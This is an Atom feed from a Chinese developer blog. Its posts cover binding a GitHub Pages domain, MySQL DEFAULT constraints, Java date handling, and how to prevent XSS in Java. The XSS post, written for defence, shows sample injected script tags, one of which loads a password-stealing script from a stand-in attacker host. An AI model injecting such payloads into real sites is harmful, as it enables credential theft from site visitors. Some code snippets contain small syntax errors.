<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Amosannn</title>
  <subtitle>Amo&#39;s binary space</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://amosannn.github.io/"/>
  <updated>2017-06-01T14:47:29.613Z</updated>
  <id>https://amosannn.github.io/</id>
  
  <author>
    <name>Amosannn</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>给GitHub Pages绑定域名 附namesilo域名优惠券</title>
    <link href="https://amosannn.github.io/2017/06/01/github-blog-binding-domain/"/>
    <id>https://amosannn.github.io/2017/06/01/github-blog-binding-domain/</id>
    <published>2017-06-01T11:51:17.000Z</published>
    <updated>2017-06-01T14:47:29.613Z</updated>
    
    <content type="html"><![CDATA[<p>在GitHub上托管Hexo博客，访问地址自然是username.github.io，如果想用自己的域名访问这个网址，怎么做呢？<br>本文从域名选购到域名绑定一条龙,给你一个更清晰的操作流程。<br><a id="more"></a></p>
<h1 id="域名选购"><a href="#域名选购" class="headerlink" title="域名选购"></a>域名选购</h1><p>若已有域名可直接跳到<a href="#使用DNSPod解析服务">第二步</a>。</p>
<p>说到域名选购，大家第一个想到的应该是狗爹(godaddy)？name？或namecheap？我使用的域名商叫<code>namesilo</code>，虽不是老牌的域名商，却也不是小年轻。并且不需要你有paypal或双币信用卡，良心地<code>支持支付宝</code>，还<code>免费赠送Whois隐私保护</code>。可能你们也听说过，没错我就是冲着赠送的whois保护去的哈哈哈~~<br>进入<a href="www.namesilo.com">namesilo官网</a>，点击右上角创建账户</p>
<p><img src="/images/namesilo-address-info.png" alt=""><br>值得一提的是上图红框中的信息最好填写真实地址，毕竟账号丢了或者因为其他原因登录不了，你得凭借真实信息找回账号的嘛。whois隐私保护的好处也就体现在这里，你的私人信息只有namesilo看得到。</p>
<p><img src="/images/namesilo-buy.png" alt=""><br>选择你想要的域名</p>
<p><img src="/images/namesilo-cart.png" alt=""><br>然后这个页面记得选上<code>privacy setting</code>里的whois保护</p>
<p>以及每个账户仅限一次的1美元优惠，填入<code>11%off</code>或者<code>1udown</code>即可以$7.99的价格拿下这个域名。</p>
<p>今天的汇率是 $1 : ￥6.8 你们呢2333</p>
<h1 id="域名绑定"><a href="#域名绑定" class="headerlink" title="域名绑定"></a>域名绑定</h1><h2 id="更改namesilo的dns指向"><a href="#更改namesilo的dns指向" class="headerlink" title="更改namesilo的dns指向"></a>更改namesilo的dns指向</h2><p>如果在域名购买时，表单中的NameServers有填入dns的话，就可以直接跳到<a href="#使用DNSPod解析服务">下一步</a>啦。</p>
<p><img src="/images/namesilo-dns.png" alt=""><br>如果没有的话就在右上角<code>Manage My Domains</code>中点击这个蓝色小按钮，删除其中的三条默认dns解析地址，再回来点击<code>ChangeNameservers</code>按钮。</p>
<p><img src="/images/namesilo-change.png" alt=""><br>将<code>NameServer 1</code>和<code>NameServer 2</code>改成</p>
<blockquote>
<p>f1g1ns1.dnspod.net<br>f1g1ns2.dnspod.net</p>
</blockquote>
<p>当然你想用默认或其他的dns解析服务也行。</p>
<h2 id="使用DNSPod解析服务"><a href="#使用DNSPod解析服务" class="headerlink" title="使用DNSPod解析服务"></a>使用DNSPod解析服务</h2><p>提供dns解析的商家有很多，这里只给出DNSPod的操作步骤，但是一通百通，界面不一样，操作手法还是相同的。<br><img src="/images/dnspod-setting.png" alt=""></p>
<p>添加三个数据</p>
<blockquote>
<p>@  A  192.30.252.153<br>@  A  192.30.252.154<br>www  CNAME  username.github.io</p>
</blockquote>
<p>注意：CNAME后的ip地址，千万不要使用ping命令得到的ip，因为GitHub Pages的页面ip不是固定ip，可能这阵子可以正常解析到你的页面，过阵子可能就解析到别人的页面去了！</p>
<h3 id="主机记录和记录类型说明"><a href="#主机记录和记录类型说明" class="headerlink" title="主机记录和记录类型说明"></a>主机记录和记录类型说明</h3><blockquote>
<p>www：解析后的域名为 www.xxxxx.com<br>@：直接解析主域名 xxxxx.com<br><em>：泛解析，匹配其他所有域名 </em>.xxxxx.com</p>
<p>A记录：地址记录，用来指定域名的IPv4地址（如：8.8.8.8），如果需要将域名指向一个IP地址，就需要添加A记录。<br>CNAME： 如果需要将域名指向另一个域名，再由另一个域名提供ip地址，就需要添加CNAME记录。</p>
</blockquote>
<h2 id="添加CNAME文件"><a href="#添加CNAME文件" class="headerlink" title="添加CNAME文件"></a>添加CNAME文件</h2><p>在Hexo本地目录中的source文件夹里，添加一个命名为CNAME的无后缀文件，文件中的填写你的域名.<br>如果你想让地址栏的域名显示www前缀就输入<code>www.xxxcc.com</code>，否则输入<code>xxxxx.com</code>即可。<br>例如</p>
<blockquote>
<p>www.xxxxx.com</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">hexo c</div><div class="line">hexo g -d</div></pre></td></tr></table></figure>
<p>配置完后等待一会儿就可以访问啦~</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;在GitHub上托管Hexo博客，访问地址自然是username.github.io，如果想用自己的域名访问这个网址，怎么做呢？&lt;br&gt;本文从域名选购到域名绑定一条龙,给你一个更清晰的操作流程。&lt;br&gt;
    
    </summary>
    
    
      <category term="GitHub" scheme="https://amosannn.github.io/tags/GitHub/"/>
    
      <category term="namesilo" scheme="https://amosannn.github.io/tags/namesilo/"/>
    
      <category term="domain" scheme="https://amosannn.github.io/tags/domain/"/>
    
      <category term="Hexo" scheme="https://amosannn.github.io/tags/Hexo/"/>
    
      <category term="DNSPod" scheme="https://amosannn.github.io/tags/DNSPod/"/>
    
  </entry>
  
  <entry>
    <title>MySQL的default约束用法</title>
    <link href="https://amosannn.github.io/2017/05/31/mysql-default-constraint/"/>
    <id>https://amosannn.github.io/2017/05/31/mysql-default-constraint/</id>
    <published>2017-05-31T14:19:51.000Z</published>
    <updated>2017-05-31T15:00:37.258Z</updated>
    
    <content type="html"><![CDATA[<p>在sql最基本的curd语句使用熟练后，我开始发现提高数据库的稳定性和易用性需要一些其他的东西，比如<code>constraint</code>(约束)。</p>
<p>我就一个没经过数据加密的user表演示一下<code>default约束</code>的用法。</p>
<h2 id="建表语句中使用"><a href="#建表语句中使用" class="headerlink" title="建表语句中使用"></a>建表语句中使用</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">create</span> <span class="keyword">table</span> <span class="keyword">user</span>(</div><div class="line">	<span class="keyword">id</span> <span class="built_in">int</span>(<span class="number">11</span>) <span class="keyword">not</span> <span class="literal">null</span> auto_increment,</div><div class="line">	username <span class="built_in">varchar</span>(<span class="number">255</span>) <span class="keyword">default</span> <span class="literal">null</span>,</div><div class="line">	<span class="keyword">status</span> <span class="built_in">varchar</span>(<span class="number">255</span>) <span class="keyword">default</span> <span class="string">"active"</span>;</div><div class="line">	primary key (id)</div><div class="line">) engine=InnoDB default charset=utf8;</div></pre></td></tr></table></figure>
<h2 id="已有表结构？使用alter插入字段"><a href="#已有表结构？使用alter插入字段" class="headerlink" title="已有表结构？使用alter插入字段"></a>已有表结构？使用alter插入字段</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">alter</span> <span class="keyword">table</span> <span class="keyword">user</span> <span class="keyword">add</span> <span class="keyword">status</span> <span class="built_in">varchar</span>(<span class="number">255</span>) <span class="keyword">default</span> <span class="string">"active"</span>;</div></pre></td></tr></table></figure>
<h2 id="有默认值的表如何添加数据"><a href="#有默认值的表如何添加数据" class="headerlink" title="有默认值的表如何添加数据"></a>有默认值的表如何添加数据</h2><p>那么表结构已经有了<code>default约束</code>，在插入值的时候如何处理字段的默认值呢？<br>传入null？空字符串？或者是不填？都不行！<br><a id="more"></a><br>答案是<code>传入default关键字</code>，表示插入字段预设的默认值。<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">insert</span> <span class="keyword">into</span> <span class="keyword">user</span> <span class="keyword">values</span>(<span class="literal">null</span>, <span class="string">"c"</span>, <span class="string">"c"</span>, <span class="keyword">default</span>);</div></pre></td></tr></table></figure></p>
<p>你想覆盖default约束传入自定义值？ 填写对应类型的值就行了。</p>
<hr>
<p>参考链接：<br><a href="https://www.w3schools.com/sql/sql_default.asp" target="_blank" rel="external">SQL DEFAULT Constraint</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;在sql最基本的curd语句使用熟练后，我开始发现提高数据库的稳定性和易用性需要一些其他的东西，比如&lt;code&gt;constraint&lt;/code&gt;(约束)。&lt;/p&gt;
&lt;p&gt;我就一个没经过数据加密的user表演示一下&lt;code&gt;default约束&lt;/code&gt;的用法。&lt;/p&gt;
&lt;h2 id=&quot;建表语句中使用&quot;&gt;&lt;a href=&quot;#建表语句中使用&quot; class=&quot;headerlink&quot; title=&quot;建表语句中使用&quot;&gt;&lt;/a&gt;建表语句中使用&lt;/h2&gt;&lt;figure class=&quot;highlight sql&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;create&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;table&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;user&lt;/span&gt;(&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	&lt;span class=&quot;keyword&quot;&gt;id&lt;/span&gt; &lt;span class=&quot;built_in&quot;&gt;int&lt;/span&gt;(&lt;span class=&quot;number&quot;&gt;11&lt;/span&gt;) &lt;span class=&quot;keyword&quot;&gt;not&lt;/span&gt; &lt;span class=&quot;literal&quot;&gt;null&lt;/span&gt; auto_increment,&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	username &lt;span class=&quot;built_in&quot;&gt;varchar&lt;/span&gt;(&lt;span class=&quot;number&quot;&gt;255&lt;/span&gt;) &lt;span class=&quot;keyword&quot;&gt;default&lt;/span&gt; &lt;span class=&quot;literal&quot;&gt;null&lt;/span&gt;,&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	&lt;span class=&quot;keyword&quot;&gt;status&lt;/span&gt; &lt;span class=&quot;built_in&quot;&gt;varchar&lt;/span&gt;(&lt;span class=&quot;number&quot;&gt;255&lt;/span&gt;) &lt;span class=&quot;keyword&quot;&gt;default&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;&quot;active&quot;&lt;/span&gt;;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	primary key (id)&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;) engine=InnoDB default charset=utf8;&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h2 id=&quot;已有表结构？使用alter插入字段&quot;&gt;&lt;a href=&quot;#已有表结构？使用alter插入字段&quot; class=&quot;headerlink&quot; title=&quot;已有表结构？使用alter插入字段&quot;&gt;&lt;/a&gt;已有表结构？使用alter插入字段&lt;/h2&gt;&lt;figure class=&quot;highlight sql&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;alter&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;table&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;user&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;add&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;status&lt;/span&gt; &lt;span class=&quot;built_in&quot;&gt;varchar&lt;/span&gt;(&lt;span class=&quot;number&quot;&gt;255&lt;/span&gt;) &lt;span class=&quot;keyword&quot;&gt;default&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;&quot;active&quot;&lt;/span&gt;;&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h2 id=&quot;有默认值的表如何添加数据&quot;&gt;&lt;a href=&quot;#有默认值的表如何添加数据&quot; class=&quot;headerlink&quot; title=&quot;有默认值的表如何添加数据&quot;&gt;&lt;/a&gt;有默认值的表如何添加数据&lt;/h2&gt;&lt;p&gt;那么表结构已经有了&lt;code&gt;default约束&lt;/code&gt;，在插入值的时候如何处理字段的默认值呢？&lt;br&gt;传入null？空字符串？或者是不填？都不行！&lt;br&gt;
    
    </summary>
    
    
      <category term="MySQL" scheme="https://amosannn.github.io/tags/MySQL/"/>
    
      <category term="Database" scheme="https://amosannn.github.io/tags/Database/"/>
    
  </entry>
  
  <entry>
    <title>使用Calendar或DateFormat拆分日期</title>
    <link href="https://amosannn.github.io/2017/05/28/java-get-time/"/>
    <id>https://amosannn.github.io/2017/05/28/java-get-time/</id>
    <published>2017-05-28T15:18:28.000Z</published>
    <updated>2017-05-31T15:00:34.226Z</updated>
    
    <content type="html"><![CDATA[<p>今天碰到获取时间中月份和日期的需求，立马去翻jdk，发现<code>util.Date类</code>中的获取方法竟然在jdk1.1就过期了…<br>于是按着jdk中推荐的<code>Calendar类</code>摸过去，找到方法。但是不知道为什么Date里的get方法不推荐了，找机会一定要瞅一瞅源码(ง๑ •̀_•́)ง</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line"><span class="comment">/*</span></div><div class="line"> 使用Calendar实现时间拆解</div><div class="line">/*</div><div class="line">public void getTimeByCalendar()&#123;</div><div class="line">	Calendar cal = Calendar.getInstance();</div><div class="line">	cal.setTime(new Date());//  传入Date对象即可</div><div class="line">	int year = cal.get(Calendar.YEAR);// 获取年份</div><div class="line">	int month=cal.get(Calendar.MONTH);// 获取月份</div><div class="line">	int day=cal.get(Calendar.DATE);// 获取日</div><div class="line">	int hour=cal.get(Calendar.HOUR);// 小时</div><div class="line">	int minute=cal.get(Calendar.MINUTE);// 分           </div><div class="line">	int second=cal.get(Calendar.SECOND);// 秒</div><div class="line">	int dayOfWeek = cal.get(Calendar.DAY_OF_WEEK);// 一周的第几天</div><div class="line">	System.out.println("现在的时间是：公元"+year+"年"+month+"月"+day+"日      "+hour+"时"+minute+"分"+second+"秒       星期"+dayOfWeek);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>翻jdk的同时还发现另一种拆分时间的方法，但是没有<code>Calendar</code>自由。<br><a id="more"></a><br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line"><span class="comment">/*</span></div><div class="line">使用DateFormat实现时间拆解</div><div class="line">*/</div><div class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">getTimeByDate</span><span class="params">()</span></span>&#123;</div><div class="line">    Date date = <span class="keyword">new</span> Date();</div><div class="line">    DateFormat df1 = DateFormat.getDateInstance();<span class="comment">//日期格式，精确到日</span></div><div class="line">    DateFormat df2 = DateFormat.getDateTimeInstance();<span class="comment">//可以精确到时分秒</span></div><div class="line">    DateFormat df3 = DateFormat.getTimeInstance();<span class="comment">//只显示出时分秒</span></div><div class="line">    DateFormat df4 = DateFormat.getDateTimeInstance(DateFormat.FULL,DateFormat.FULL); <span class="comment">//显示日期，周，上下午，时间（精确到秒）</span></div><div class="line">    DateFormat df5 = DateFormat.getDateTimeInstance(DateFormat.LONG,DateFormat.LONG); <span class="comment">//显示日期,上下午，时间（精确到秒）</span></div><div class="line">    DateFormat df6 = DateFormat.getDateTimeInstance(DateFormat.SHORT,DateFormat.SHORT); <span class="comment">//显示日期，上下午,时间（精确到分）</span></div><div class="line">    DateFormat df7 = DateFormat.getDateTimeInstance(DateFormat.MEDIUM,DateFormat.MEDIUM); <span class="comment">//显示日期，时间（精确到分）</span></div><div class="line">    System.out.println(df1.format(date));</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>我个人是比较喜欢Calendar啦，虽然觉得Date类中的get方法更方便，但毕竟oracle不推荐了，那就算了吧。<br>说来说去不就是为了少写几行代码吗Orz</p>
<hr>
<p>相关链接：<br><a href="http://docs.oracle.com/javase/8/docs/api/index.html" target="_blank" rel="external">Java™ Platform, Standard Edition 8 API Specification</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;今天碰到获取时间中月份和日期的需求，立马去翻jdk，发现&lt;code&gt;util.Date类&lt;/code&gt;中的获取方法竟然在jdk1.1就过期了…&lt;br&gt;于是按着jdk中推荐的&lt;code&gt;Calendar类&lt;/code&gt;摸过去，找到方法。但是不知道为什么Date里的get方法不推荐了，找机会一定要瞅一瞅源码(ง๑ •̀_•́)ง&lt;/p&gt;
&lt;figure class=&quot;highlight java&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;8&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;9&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;10&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;11&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;12&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;13&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;14&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;15&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;/*&lt;/div&gt;&lt;div class=&quot;line&quot;&gt; 使用Calendar实现时间拆解&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;/*&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;public void getTimeByCalendar()&amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	Calendar cal = Calendar.getInstance();&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	cal.setTime(new Date());//  传入Date对象即可&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	int year = cal.get(Calendar.YEAR);// 获取年份&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	int month=cal.get(Calendar.MONTH);// 获取月份&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	int day=cal.get(Calendar.DATE);// 获取日&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	int hour=cal.get(Calendar.HOUR);// 小时&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	int minute=cal.get(Calendar.MINUTE);// 分           &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	int second=cal.get(Calendar.SECOND);// 秒&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	int dayOfWeek = cal.get(Calendar.DAY_OF_WEEK);// 一周的第几天&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	System.out.println(&quot;现在的时间是：公元&quot;+year+&quot;年&quot;+month+&quot;月&quot;+day+&quot;日      &quot;+hour+&quot;时&quot;+minute+&quot;分&quot;+second+&quot;秒       星期&quot;+dayOfWeek);&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;翻jdk的同时还发现另一种拆分时间的方法，但是没有&lt;code&gt;Calendar&lt;/code&gt;自由。&lt;br&gt;
    
    </summary>
    
    
      <category term="java" scheme="https://amosannn.github.io/tags/java/"/>
    
  </entry>
  
  <entry>
    <title>Java如何防范XSS攻击</title>
    <link href="https://amosannn.github.io/2017/05/27/xss/"/>
    <id>https://amosannn.github.io/2017/05/27/xss/</id>
    <published>2017-05-27T14:45:01.000Z</published>
    <updated>2017-05-27T16:12:54.053Z</updated>
    
    <content type="html"><![CDATA[<h1 id="什么是XSS"><a href="#什么是XSS" class="headerlink" title="什么是XSS"></a>什么是XSS</h1><p>XSS攻击：跨站脚本攻击(Cross Site Scripting)，为不和层叠样式表(Cascading Style Sheets, CSS)的缩写混淆，故将跨站脚本攻击缩写为XSS。</p>
<p>XSS是一种经常出现在web应用中的计算机安全漏洞…多的就不说了，<a href="https://zh.wikipedia.org/wiki/%E8%B7%A8%E7%B6%B2%E7%AB%99%E6%8C%87%E4%BB%A4%E7%A2%BC" target="_blank" rel="external">wiki</a>里写的很清楚。</p>
<h1 id="XSS原理"><a href="#XSS原理" class="headerlink" title="XSS原理"></a>XSS原理</h1><p>我来讲讲我接触到的XSS攻击，容易发生事故的地方就在评论区或问卷提交、注册等等涉及到文本提交操作的步骤中。如果你像我一样是一个勤勤恳恳牢记社会主义核心价值观的少先队员，一定会按问题提示或页面提示输入自然语言。而如果是动了歪脑筋的坏人，他可能会输入这样的信息来恶搞你。<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;script&gt;alert(<span class="string">"未满十八岁不得浏览该网站"</span>);&lt;/script&gt;</div></pre></td></tr></table></figure></p>
<p>你可能觉得这没什么，但如果他是个超级坏人，提交的不是这种简单的弹窗脚本，而是这样呢？<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;script src=<span class="string">"www.hackyou.com/getallpassword.js"</span>&gt;&lt;/script&gt;</div></pre></td></tr></table></figure></p>
<p>惊不惊喜？<br><a id="more"></a></p>
<h1 id="XSS漏洞分类"><a href="#XSS漏洞分类" class="headerlink" title="XSS漏洞分类"></a>XSS漏洞分类</h1><p>XSS通常有两类：</p>
<blockquote>
<ul>
<li>存储型XSS，主要出现在用户输入后会在下个页面显示的表单。例如评论或调查问卷。</li>
<li>反射型XSS，主要表现为将脚本代码添加进URL地址的请求参数中。</li>
</ul>
</blockquote>
<h1 id="如何预防XSS"><a href="#如何预防XSS" class="headerlink" title="如何预防XSS"></a>如何预防XSS</h1><p>在用户的每次提交前进行html转义，将html中的特定符号，如<code>&lt;</code> <code>&gt;</code> <code>&amp;</code> <code>&quot;</code>等分别转换为html转义字符<code>&amp;lt;</code> <code>&amp;gt;</code> <code>&amp;amp;</code> <code>&amp;quot;</code> 。</p>
<p>java转义方法：<br>使用jar包 <code>org.springframework.web.util.HtmlUtils</code>，关于html转义的操作：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="comment">/** HTML转义 **/</span>  </div><div class="line">String s = HtmlUtils.htmlEscape(<span class="string">"&lt;div&gt;hello world&lt;/div&gt;&lt;p&gt;&amp;nbsp;&lt;/p&gt;"</span>);  </div><div class="line">System.out.println(s);  </div><div class="line">String s2 = HtmlUtils.htmlUnescape(s);  </div><div class="line">System.out.println(s2);</div></pre></td></tr></table></figure></p>
<p>实例：在调用和数据库连接的DAO方法前，进行转义，例如注册和评论等功能。<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">public</span> String <span class="title">doreview</span><span class="params">(HttpServletRequest request, HttpServletResponse response, Page page)</span></span>&#123;</div><div class="line">	<span class="keyword">int</span> oid = Integer.parseInt(request.getParameter(<span class="string">"oid"</span>));</div><div class="line">	Order o = orderDAO.get(oid);</div><div class="line">	o.setStatus(orderDAO.finish);</div><div class="line">	orderDAO.update(o);</div><div class="line">	<span class="keyword">int</span> pid = Integer.parseInt(request.getParameter(<span class="string">"pid"</span>));</div><div class="line">	Product p = productDAO.get(pid);</div><div class="line"></div><div class="line">	String content = request.getParameter(<span class="string">"content"</span>);</div><div class="line">	content = HtmlUtils.htmlEscape(content);</div><div class="line"></div><div class="line">	User user = (User) request.getSession().getAttribute(<span class="string">"user"</span>);</div><div class="line">	Review review = <span class="keyword">new</span> Review();</div><div class="line">	review.setContent(content);</div><div class="line">	review.setProduct(p);</div><div class="line">	review.setCreateDate(<span class="keyword">new</span> Date());</div><div class="line">	review.setUser(user);</div><div class="line">	reviewDAO.add(review);</div><div class="line">	<span class="keyword">return</span> <span class="string">"@forereview?oid="</span>+oid+<span class="string">"&amp;showonly=true"</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>相关链接:<br><a href="https://www.zhihu.com/question/19739025" target="_blank" rel="external">2011年新浪微博XSS事件</a><br><a href="https://gist.github.com/ninehills/1053066" target="_blank" rel="external">新浪微博XSS攻击代码</a><br><a href="http://tool.oschina.net/commons?type=2" target="_blank" rel="external">html转义字符对照表</a><br><a href="http://tieba.baidu.com/p/3567794788" target="_blank" rel="external">简单说下XSS黑站，请注意防范。</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;什么是XSS&quot;&gt;&lt;a href=&quot;#什么是XSS&quot; class=&quot;headerlink&quot; title=&quot;什么是XSS&quot;&gt;&lt;/a&gt;什么是XSS&lt;/h1&gt;&lt;p&gt;XSS攻击：跨站脚本攻击(Cross Site Scripting)，为不和层叠样式表(Cascading Style Sheets, CSS)的缩写混淆，故将跨站脚本攻击缩写为XSS。&lt;/p&gt;
&lt;p&gt;XSS是一种经常出现在web应用中的计算机安全漏洞…多的就不说了，&lt;a href=&quot;https://zh.wikipedia.org/wiki/%E8%B7%A8%E7%B6%B2%E7%AB%99%E6%8C%87%E4%BB%A4%E7%A2%BC&quot;&gt;wiki&lt;/a&gt;里写的很清楚。&lt;/p&gt;
&lt;h1 id=&quot;XSS原理&quot;&gt;&lt;a href=&quot;#XSS原理&quot; class=&quot;headerlink&quot; title=&quot;XSS原理&quot;&gt;&lt;/a&gt;XSS原理&lt;/h1&gt;&lt;p&gt;我来讲讲我接触到的XSS攻击，容易发生事故的地方就在评论区或问卷提交、注册等等涉及到文本提交操作的步骤中。如果你像我一样是一个勤勤恳恳牢记社会主义核心价值观的少先队员，一定会按问题提示或页面提示输入自然语言。而如果是动了歪脑筋的坏人，他可能会输入这样的信息来恶搞你。&lt;br&gt;&lt;figure class=&quot;highlight javascript&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;&amp;lt;script&amp;gt;alert(&lt;span class=&quot;string&quot;&gt;&quot;未满十八岁不得浏览该网站&quot;&lt;/span&gt;);&amp;lt;/script&amp;gt;&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;你可能觉得这没什么，但如果他是个超级坏人，提交的不是这种简单的弹窗脚本，而是这样呢？&lt;br&gt;&lt;figure class=&quot;highlight javascript&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;&amp;lt;script src=&lt;span class=&quot;string&quot;&gt;&quot;www.hackyou.com/getallpassword.js&quot;&lt;/span&gt;&amp;gt;&amp;lt;/script&amp;gt;&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;惊不惊喜？&lt;br&gt;
    
    </summary>
    
    
      <category term="java" scheme="https://amosannn.github.io/tags/java/"/>
    
      <category term="Network Security" scheme="https://amosannn.github.io/tags/Network-Security/"/>
    
  </entry>
  
  <entry>
